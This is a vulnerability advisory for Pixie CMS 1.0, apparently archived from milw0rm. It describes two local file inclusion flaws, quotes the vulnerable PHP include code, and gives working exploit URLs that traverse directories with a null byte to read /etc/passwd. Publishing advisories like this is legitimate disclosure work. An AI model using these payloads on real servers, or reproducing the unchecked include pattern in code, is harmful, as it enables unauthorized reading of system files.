@@ -1,0 +1,89 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-005
+
+
+Application:                    Pixie CMS
+Versions Affected:              1.0
+Vendor URL:                     http://www.getpixie.co.uk/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       29.08.2008
+Vendor Response:                30.08.2008
+Solution:                       NONE
+Date of Public Advisory:        27.01.2009
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Pixie CMS has Multiple Local File Include vulnerabilities. 
+
+Input parameters is not properly verified before being used to include files.
+This can be exploited to include arbitrary files from local resources.
+
+Details
+*******
+
+1. Local File Include vulnerability found in script /admin/admin/modules/mod_settings.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [line 9-15]
+----------------
+#################################################
+
+if ($GLOBALS['pixie_user'] && $GLOBALS['pixie_user_privs'] >= 2) {
+        if (file_exists("admin/modules/mod_$x.php")) {
+                include("admin/modules/mod_$x.php");
+        } else {
+                $message = "Admin module $x has been removed from the admin modules folder.";
+        }
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/admin/modules/mod_settings.php?pixie_user=DSecRG&pixie_user_privs=2&x=../../../../../../../../../../../../../etc/passwd%00
+
+
+2. Local File Include vulnerability found in script /admin/admin/modules/mod_myaccount.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code [line 9, 109-113]
+----------------------
+#################################################
+
+if ($GLOBALS['pixie_user']) {
+
+...
+
+        if ($m) {
+                include("../admin/modules/$m.php");
+        } else if ($x) {
+                include("mod_$x.php");
+        } else {
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/admin/admin/modules/mod_myaccount.php?pixie_user=DSecRG&m=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/admin/admin/modules/mod_myaccount.php?pixie_user=DSecRG&x=../../../../../../../../../../../../../etc/passwd%00
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsecrg.com
+            http://www.dsec.ru
+
+# milw0rm.com [2009-01-27]
